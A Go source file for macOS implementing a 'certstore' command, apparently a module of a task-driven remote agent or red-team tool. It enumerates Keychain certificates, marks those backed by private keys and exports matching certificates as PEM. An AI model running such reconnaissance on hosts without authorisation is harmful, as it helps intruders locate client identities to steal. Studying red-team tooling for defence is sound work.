//go:build darwin

package commands

import (
	"crypto/sha1"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"os/exec"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

type CertstoreCommand struct{}

func (c *CertstoreCommand) Name() string { return "certstore" }
func (c *CertstoreCommand) Description() string {
	return "Enumerate macOS Keychain certificates: list, find, export, info"
}

func (c *CertstoreCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := requireParams[certstoreParamsDarwin](task)
	if parseErr != nil {
		return *parseErr
	}
	if params.Action == "" {
		params.Action = "list"
	}

	switch params.Action {
	case "list":
		return certstoreListDarwin(params.Store, params.Filter)
	case "find":
		return certstoreListDarwin(params.Store, params.Filter)
	case "export":
		return certstoreExportDarwin(params.Filter)
	case "delete", "import":
		return errorf("Action '%s' requires elevated permissions on macOS and is not supported", params.Action)
	default:
		return errorf("Unknown action: %s (use 'list', 'find', 'export')", params.Action)
	}
}

type certstoreParamsDarwin struct {
	Action   string `json:"action"`
	Store    string `json:"store"`
	Filter   string `json:"filter"`
	Format   string `json:"format"`
	Password string `json:"password"`
	Data     string `json:"data"`
}

// certstoreListDarwin enumerates certificates from macOS Keychains using the security CLI.
func certstoreListDarwin(store, filter string) structs.CommandResult {
	// Get all certificates as PEM
	args := []string{"find-certificate", "-a", "-p"}

	// Add keychain path if specified
	switch strings.ToLower(store) {
	case "login", "my":
		args = append(args, getKeychainPath("login"))
	case "system", "root":
		args = append(args, "/Library/Keychains/System.keychain")
	case "system-roots":
		args = append(args, "/System/Library/Keychains/SystemRootCertificates.keychain")
	}

	cmd := exec.Command("security", args...)
	output, err := cmd.Output()
	if err != nil {
		return errorf("Failed to enumerate certificates: %v", err)
	}

	// Parse PEM blocks
	type certEntry struct {
		Subject      string `json:"subject"`
		Issuer       string `json:"issuer"`
		SerialNumber string `json:"serial_number,omitempty"`
		NotBefore    string `json:"not_before,omitempty"`
		NotAfter     string `json:"not_after,omitempty"`
		Expired      bool   `json:"expired,omitempty"`
		Thumbprint   string `json:"thumbprint"`
		HasPrivKey   bool   `json:"has_private_key"`
		KeyBits      int    `json:"key_bits,omitempty"`
		Store        string `json:"store"`
	}

	var entries []certEntry
	rest := output
	now := time.Now()
	filterLower := strings.ToLower(filter)

	for {
		var block *pem.Block
		block, rest = pem.Decode(rest)
		if block == nil {
			break
		}

		cert, err := x509.ParseCertificate(block.Bytes)
		if err != nil {
			continue
		}

		subject := cert.Subject.String()
		issuer := cert.Issuer.String()
		serial := fmt.Sprintf("%X", cert.SerialNumber)
		thumbprint := fmt.Sprintf("%X", sha1.Sum(cert.Raw))

		// Apply filter
		if filter != "" {
			searchStr := strings.ToLower(subject + issuer + serial + thumbprint)
			if !strings.Contains(searchStr, filterLower) {
				continue
			}
		}

		// Check for identity (cert with private key) using security find-identity
		hasPrivKey := false

		keyBits := 0
		if cert.PublicKey != nil {
			switch k := cert.PublicKey.(type) {
			case interface{ Size() int }:
				keyBits = k.Size() * 8
			default:
				_ = k
			}
		}

		storeName := "Keychain"
		if store != "" {
			storeName = store
		}

		entries = append(entries, certEntry{
			Subject:      subject,
			Issuer:       issuer,
			SerialNumber: serial,
			NotBefore:    cert.NotBefore.Format("2006-01-02"),
			NotAfter:     cert.NotAfter.Format("2006-01-02"),
			Expired:      now.After(cert.NotAfter),
			Thumbprint:   thumbprint,
			HasPrivKey:   hasPrivKey,
			KeyBits:      keyBits,
			Store:        storeName,
		})
	}

	// Check for identities (certs with private keys)
	identityCmd := exec.Command("security", "find-identity", "-v", "-p", "ssl-client")
	identityOutput, _ := identityCmd.Output()
	identityThumbprints := make(map[string]bool)
	for _, line := range strings.Split(string(identityOutput), "\n") {
		line = strings.TrimSpace(line)
		// Format: "  1) SHA1HASH \"Common Name (Type)\""
		if len(line) > 5 && line[0] >= '0' && line[0] <= '9' {
			// Skip the number prefix
		}
		// Extract thumbprint (40-char hex)
		parts := strings.Fields(line)
		for _, p := range parts {
			if len(p) == 40 {
				allHex := true
				for _, c := range p {
					if !((c >= '0' && c <= '9') || (c >= 'A' && c <= 'F') || (c >= 'a' && c <= 'f')) {
						allHex = false
						break
					}
				}
				if allHex {
					identityThumbprints[strings.ToUpper(p)] = true
				}
			}
		}
	}

	// Mark entries with private keys
	for i := range entries {
		if identityThumbprints[entries[i].Thumbprint] {
			entries[i].HasPrivKey = true
		}
	}

	jsonBytes, _ := json.Marshal(entries)

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== macOS Keychain Certificates (%d) ===\n\n", len(entries)))
	for _, e := range entries {
		privKeyFlag := ""
		if e.HasPrivKey {
			privKeyFlag = " [HAS PRIVATE KEY]"
		}
		expiredFlag := ""
		if e.Expired {
			expiredFlag = " [EXPIRED]"
		}
		sb.WriteString(fmt.Sprintf("Subject: %s\n  Issuer: %s\n  Serial: %s\n  Valid: %s to %s%s\n  Thumbprint: %s%s\n  Store: %s\n\n",
			e.Subject, e.Issuer, e.SerialNumber, e.NotBefore, e.NotAfter, expiredFlag,
			e.Thumbprint, privKeyFlag, e.Store))
	}

	return structs.CommandResult{
		Output: sb.String() + "\n" + string(jsonBytes),
		Status: "success",
	}
}

// certstoreExportDarwin exports a certificate from the Keychain as PEM.
func certstoreExportDarwin(filter string) structs.CommandResult {
	if filter == "" {
		return errorResult("filter is required for export (use thumbprint or subject name)")
	}

	// Use security find-certificate with subject filter and export as PEM
	cmd := exec.Command("security", "find-certificate", "-c", filter, "-p")
	output, err := cmd.Output()
	if err != nil {
		return errorf("Certificate not found: %v", err)
	}

	if len(output) == 0 {
		return errorResult("No certificate found matching filter: " + filter)
	}

	return successResult(fmt.Sprintf("=== Exported Certificate (PEM) ===\nFilter: %s\n\n%s", filter, string(output)))
}

// getKeychainPath returns the path to the user's login keychain.
func getKeychainPath(name string) string {
	cmd := exec.Command("security", "default-keychain")
	output, err := cmd.Output()
	if err != nil || name != "login" {
		return ""
	}
	path := strings.TrimSpace(string(output))
	path = strings.Trim(path, "\"")
	return path
}
